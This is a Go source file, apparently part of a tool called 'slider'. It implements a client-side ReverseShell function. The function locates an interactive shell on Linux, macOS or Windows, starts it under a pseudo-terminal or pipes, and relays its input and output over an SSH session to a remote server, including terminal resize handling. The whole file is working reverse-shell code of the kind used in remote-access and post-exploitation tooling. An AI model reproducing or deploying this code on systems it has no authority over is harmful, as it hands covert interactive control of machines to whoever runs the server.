package client

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"slider/pkg/sconn"

	"github.com/creack/pty"
)

type Interpreter struct {
	cmd  string
	args []string
	pty  string
	size sconn.TermSize
}

var nixShells = []string{
	"/bin/bash",
	"/bin/sh",
	"/bin/zsh",
	"/bin/csh",
	"/bin/ksh",
	"/bin/tsh",
}

func findNixShell() string {
	// TODO: May want to check if the user has execution rights
	for _, sh := range nixShells {
		if _, err := os.Stat(sh); !os.IsNotExist(err) {
			return sh
		}
	}
	return ""
}

func setInterpreter() (*Interpreter, error) {
	interpreter := &Interpreter{
		pty: "pty",
	}
	system := runtime.GOOS
	switch system {
	case "darwin":
		// Use "bash" cause "zsh" adds an extra "\n%" after return
		interpreter.cmd = "/bin/bash"
		//interpreter.pty = ""
		// Make it interactive. Among other things will show prompt
		interpreter.args = []string{"-i"}
	case "windows":
		// TODO: Logic to decide running "cmd" or "powershell" (default to "cmd") inside a "Command" or a "ConPTY"
		// https://pkg.go.dev/github.com/UserExistsError/conpty#section-readme
		// https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/
		// TODO: Default path but might not be this one
		var winCmd = "Windows\\system32\\cmd.exe"
		systemDrive := os.Getenv("SYSTEMDRIVE")
		if systemDrive == "" {
			// Try default if not automatically detected
			systemDrive = "C:"
		}
		interpreter.cmd = fmt.Sprintf("%s\\%s", systemDrive, winCmd)
		interpreter.pty = ""
	default:
		if shellEnv := os.Getenv("SHELL"); shellEnv != "" {
			interpreter.cmd = shellEnv
		} else {
			interpreter.cmd = findNixShell()
		}
		interpreter.args = []string{"-i"}
	}

	if interpreter.cmd == "" {
		return interpreter, fmt.Errorf("can not find cmd on system %s", system)
	}

	return interpreter, nil
}

func (c *client) ReverseShell() error {
	interpreter, err := setInterpreter()
	if err != nil {
		return err
	}

	stdin, stdinErr := c.sshSession.StdinPipe()
	if stdinErr != nil {
		fmt.Printf("session.StdinPipe: %s", stdinErr)
	}
	defer func() {
		_ = stdin.Close()
	}()
	stdout, stdoutErr := c.sshSession.StdoutPipe()
	if stdoutErr != nil {
		fmt.Printf("session.StdoutPipe: %s", stdoutErr)
	}

	cmd := exec.Command(interpreter.cmd, interpreter.args...)

	switch interpreter.pty {
	// TODO: Add ConPty implementation (Windows > 2018)
	case "conPty":
	case "pty":
		errSSHReq := c.answerSSHRequest("request-pty", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("request-pty %s", errSSHReq)
		}

		errSSHReq = c.answerSSHRequest("reverse-shell", true, nil)
		if errSSHReq != nil {
			return fmt.Errorf("reverse-shell %s", errSSHReq)
		}

		ptF, _ := pty.StartWithSize(cmd, &pty.Winsize{
			Rows: uint16(c.interpreter.size.Rows),
			Cols: uint16(c.interpreter.size.Cols),
		})

		// Receive Terminal size changes from the Server
		go func() {
			for r := range c.reqConnChannel {
				if r.Type == "window-change" {
					c.Debugf("Server Requested window change: %s\n", r.Payload)
					var termSize sconn.TermSize
					if err = json.Unmarshal(r.Payload, &termSize); err != nil {
						c.Fatalf("%s", err)
					}
					if sizeErr := pty.Setsize(ptF, &pty.Winsize{
						Rows: uint16(termSize.Rows),
						Cols: uint16(termSize.Cols),
					}); sizeErr != nil {
						c.Errorf("%s", sizeErr)
					}
				}
			}
		}()

		// Copy all SSH session output to the pty
		go func() {
			if _, outCopyErr := io.Copy(ptF, stdout); outCopyErr != nil {
				c.Debugf("Copy stdout: %s", outCopyErr)
			}
		}()

		// Copy pty output to SSH session stdin
		if _, inCopyErr := io.Copy(stdin, ptF); inCopyErr != nil {
			c.Debugf("Copy stdin: %s", inCopyErr)
		}
	default:
		// Pipe requirement on Windows
		rp, wp := io.Pipe()
		go func() {
			_, _ = io.Copy(wp, stdout)
			c.Debugf("out finish")
		}()

		cmd.Stdout = stdin
		cmd.Stdin = rp
		cmd.Stderr = stdin

		environment := []string{
			fmt.Sprintf("LINES=%d", c.interpreter.size.Rows),
			fmt.Sprintf("COLUMNS=%d", c.interpreter.size.Cols),
		}
		for _, envVar := range environment {
			cmd.Env = append(cmd.Environ(), envVar)
		}
		if err = cmd.Run(); err != nil {
			return err
		}
	}

	return nil
}

func (c *client) answerSSHRequest(requestType string, ok bool, payload []byte) error {
	ok, err := c.sshSession.SendRequest(requestType, ok, payload)
	if err != nil {
		return fmt.Errorf("%s %s", requestType, err)
	}
	c.Debugf("Sent Request \"%s\", received: \"%v\" from server.\n", requestType, ok)
	return nil
}
